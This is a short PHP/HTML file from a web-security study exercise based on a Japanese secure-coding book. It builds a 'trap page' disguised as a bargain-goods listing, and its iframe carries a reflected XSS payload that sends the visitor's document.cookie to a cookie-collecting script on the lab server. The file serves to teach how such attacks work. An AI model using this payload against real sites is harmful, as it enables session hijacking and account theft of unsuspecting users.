<?php
/**
 *
 * 『表示処理に伴う問題』（安全なWebアプリケーションの作り方 p88~）
 * XSSによるクッキー値の盗み出し
 *
 * *** 罠ページ（このページに飛んでる時点で罠は踏んでる） ***
 *
 * Created by IntelliJ IDEA.
 * User: xsmiledur
 * Date: 2017/06/12
 * Time: 15:44
 */
?>

<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>罠ページその２</title>
    <meta name="viewport" content="width=device-width">
    <link rel="stylesheet" href="style.css">
</head>
<body>
激安商品情報
<iframe src="/search.php?keyword=<script>window.location='/trap/get-coockie.php?sid='%2Bdocument.cookie;</script>">
</iframe>
</body>